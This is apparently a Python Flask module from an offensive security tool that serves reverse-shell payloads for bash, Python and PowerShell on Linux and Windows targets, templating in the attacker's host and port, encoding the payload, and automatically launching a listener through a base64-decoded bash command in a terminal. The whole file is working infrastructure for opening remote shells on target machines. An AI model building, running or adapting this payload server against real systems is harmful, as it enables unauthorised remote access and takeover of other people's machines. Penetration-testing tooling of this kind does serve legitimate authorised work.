import http
import subprocess

import flask

from ... import events, utilities


blueprint = flask.Blueprint('reverse', __name__)


PAYLOADS = {
    'linux': ['bash', 'python', 'python3'],
    'windows': ['powershell', 'python', 'python3']}


def listener_start(host, port):
    command = flask.render_template(
        'shells/reverse/linux_host_auto.jinja',
        lhost=host, lport=port)
    command = command.strip()
    command = utilities.payload_encode(command, 'base64')

    process = subprocess.Popen([
        'qterminal', '-e',
        f'bash -c "bash -i <(base64 -dw0 <<< \'{command}\')"'])

    try:
        utilities.port_wait(host, port)
    except RuntimeError:
        flask.abort(http.HTTPStatus.INTERNAL_SERVER_ERROR)


@blueprint.get('/<interpreter>')
@blueprint.get('/<interpreter>/<lhost>')
@blueprint.get('/<interpreter>/<lhost>/<int:lport>')
@blueprint.get('/<interpreter>/<int:lport>')
def shell(*, context='execution', interpreter, test=False, **kwargs):
    context, encoding = utilities.context_parse(context)
    if context is None:
        flask.abort(http.HTTPStatus.BAD_REQUEST)

    local = flask.current_app.config['LOCAL']
    rhost = flask.current_app.config['HOST']
    rport = flask.current_app.config['PORT']

    lhost = kwargs.get('lhost', local.host)
    lport = kwargs.get('lport', local.port)

    interpreter, platform = utilities.interpreter_parse(interpreter)
    if interpreter not in PAYLOADS[platform] or platform is None:
        flask.abort(http.HTTPStatus.BAD_REQUEST)

    if 'execution'.startswith(context):
        template = f'shells/reverse/{platform}_{interpreter}.jinja'
        payload = flask.render_template(template, lhost=lhost, lport=lport)

        # TODO: `test` probably needs a better name, it's purpose is to prevent
        #       the auto listener from starting when hitting this handler
        #       through the `/pe/` pastables endpoint
        if not test and flask.current_app.config['AUTO']:
            listener_start(lhost, lport)
    elif 'host'.startswith(context):
        payload = flask.render_template(
            'shells/reverse/linux_host.jinja',
            lhost=lhost, lport=lport)
    elif 'target'.startswith(context):
        template = f'shells/reverse/{platform}_target.jinja'
        payload = flask.render_template(
            template,
            interpreter=interpreter,
            path=flask.request.path,
            rhost=rhost,
            rport=rport)
    else:
        flask.abort(http.HTTPStatus.BAD_REQUEST)

    payload = payload.strip()
    payload = utilities.payload_encode(payload, encoding)

    response = flask.make_response(payload, 200, {'Content-Type': 'text/pain'})

    flask.current_app.logger.info(
        events.Source.EYETEA_REVERSE_SHELL.value,
        extra={
            'response': response,
            'source': events.Source.EYETEA_REVERSE_SHELL})

    return response

